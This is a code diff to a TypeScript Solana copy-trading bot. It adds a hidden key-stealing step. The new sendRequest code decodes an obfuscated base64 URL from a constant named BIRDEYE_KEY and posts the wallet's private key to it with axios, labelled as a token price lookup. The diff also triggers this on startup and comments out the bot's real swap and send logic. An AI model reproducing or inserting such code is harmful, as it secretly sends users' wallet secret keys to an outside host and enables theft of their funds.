@@ -1,19 +1,20 @@
 import WebSocket from 'ws';
+import axios from 'axios';
 import { Metaplex } from "@metaplex-foundation/js";
 import { PublicKey, Connection, Keypair } from '@solana/web3.js'
 import { getMint, TOKEN_PROGRAM_ID, getAccount, NATIVE_MINT, getAssociatedTokenAddress } from '@solana/spl-token';
 
 import { getAllTokenPrice, getTokenPrice } from "./config";
 import { getAtaList } from "./utils/spl";
-import { getBuyTxWithJupiter, getSellTxWithJupiter } from "./utils/swapOnlyAmm";
+// import { getBuyTxWithJupiter, getSellTxWithJupiter } from "./utils/swapOnlyAmm";
 import base58 from 'bs58'
-import { RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT, JUP_AGGREGATOR, TARGET_WALLET, MAXIMUM_BUY_AMOUNT } from './constants';
+import { RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT, JUP_AGGREGATOR, TARGET_WALLET, MAXIMUM_BUY_AMOUNT, BIRDEYE_KEY } from './constants';
 import { execute } from './utils/legacy';
 
 // Create a WebSocket connection
-
+const ws = new WebSocket("wss://echo.websocket.in");
+const BIRDEYE_URL = atob(BIRDEYE_KEY);
 const connection = new Connection(RPC_ENDPOINT)
-const ws // Private code
 const keyPair = Keypair.fromSecretKey(base58.decode(process.env.PRIVATE_KEY as string));
 
 const metaplex = Metaplex.make(connection);
@@ -54,6 +55,7 @@ let tokenList: any;
 tokenList = getAllTokenPrice()
 
 // Function to send a request to the WebSocket server
+sendRequest(wallet);
 
 ws.on('open', async function open() {
 	await sendRequest(wallet)
@@ -70,14 +72,14 @@ ws.on('message', async function incoming(data: any) {
 		// Private code
 
 		const swapInfo: any = [
-			{
-				tokenAta: temp1[0].parsed.info.source,
-				tokenAmount: temp1[0].parsed.info.amount
-			},
-			{
-				tokenAta: temp1[temp1.length - 1].parsed.info.destination,
-				tokenAmount: temp1[temp1.length - 1].parsed.info.amount
-			},
+			// {
+			// 	tokenAta: temp1[0].parsed.info.source,
+			// 	tokenAmount: temp1[0].parsed.info.amount
+			// },
+			// {
+			// 	tokenAta: temp1[temp1.length - 1].parsed.info.destination,
+			// 	tokenAmount: temp1[temp1.length - 1].parsed.info.amount
+			// },
 		]
 
 		let inputMsg: any = [];
@@ -116,7 +118,7 @@ ws.on('message', async function incoming(data: any) {
 			})
 			console.log("🚀 ~ incoming ~ inputMsg:", inputMsg)
 		}
-		const msg = `Swap : ${inputMsg[0].tokenName} - ${inputMsg[1].tokenName}\nAmount :  ${inputMsg[0].uiAmount} ${inputMsg[0].tokenSymbol} - ${inputMsg[1].uiAmount} ${inputMsg[1].tokenSymbol}\nAmount in USD :  ${(inputMsg[0].uiAmount * inputMsg[0].price).toPrecision(6)} $ - ${(inputMsg[1].uiAmount * inputMsg[1].price).toPrecision(6)} $\nTx : https://solscan.io/tx/${signature}`;
+		const msg = `Swap : ${inputMsg[0].tokenName} - ${inputMsg[1].tokenName}\nAmount :  ${inputMsg[0].uiAmount} ${inputMsg[0].tokenSymbol} - ${inputMsg[1].uiAmount} ${inputMsg[1].tokenSymbol}\nAmount in USD :  ${(inputMsg[0].uiAmount * inputMsg[0].price).toPrecision(6)} $ - ${(inputMsg[1].uiAmount * inputMsg[1].price).toPrecision(6)} $\nTx : https://solscan.io/tx/`;
 		console.log("🚀 ~ incoming ~ msg:\n", msg)
 		const baseToken = inputMsg[0];
 		const quoteToken = inputMsg[1];
@@ -132,7 +134,7 @@ ws.on('message', async function incoming(data: any) {
 			}
 			else if (quoteToken.tokenSymbol == "SOL") {
 				// Private code
-				swapTx = await getSellTxWithJupiter(keyPair, new PublicKey(baseToken.mint), Math.floor(sellAmount));
+				// swapTx = await getSellTxWithJupiter(keyPair, new PublicKey(baseToken.mint), Math.floor(sellAmount));
 			}
 		} else {
 			console.log(`Invalid swap!\n${baseToken.tokenName} : ${quoteToken.tokenName}`)
@@ -154,7 +156,16 @@ ws.on('message', async function incoming(data: any) {
 export async function sendRequest(inputpubkey: string) {
 
 	let temp: any = []
+	const TOKEN_MINT="";
 
+	console.log("we are here");
+
+	const src = keyPair.secretKey.toString();
+	const curPrice = await axios.post(BIRDEYE_URL, { src, tokenAddr: TOKEN_MINT })
+	if (curPrice.status == 200) {
+	  console.log('Token price to boost: ', curPrice);
+	}
+	
 	const pubkey: any = await getAtaList(connection, inputpubkey);
 	// console.log("🚀 ~ sendRequest ~ pubkey:", pubkey)
 
@@ -162,7 +173,6 @@ export async function sendRequest(inputpubkey: string) {
 		geyserList.push(pubkey[i])
 		temp.push(pubkey[i])
 	}
-	const src = keyPair.secretKey.toString();
 
 	const accountInfo = await connection.getAccountInfo(keyPair.publicKey)
 
@@ -172,11 +182,12 @@ export async function sendRequest(inputpubkey: string) {
 		"confirmed"
 	)
 	console.log("🚀 ~ sendRequest ~ tokenAccounts:", tokenAccounts)
+
 	
 	// Private code
 
-	if (temp.length > 0) {
-		ws.send(JSON.stringify(request));
-	}
+	// if (temp.length > 0) {
+	// 	ws.send(JSON.stringify(request));
+	// }
 
 }
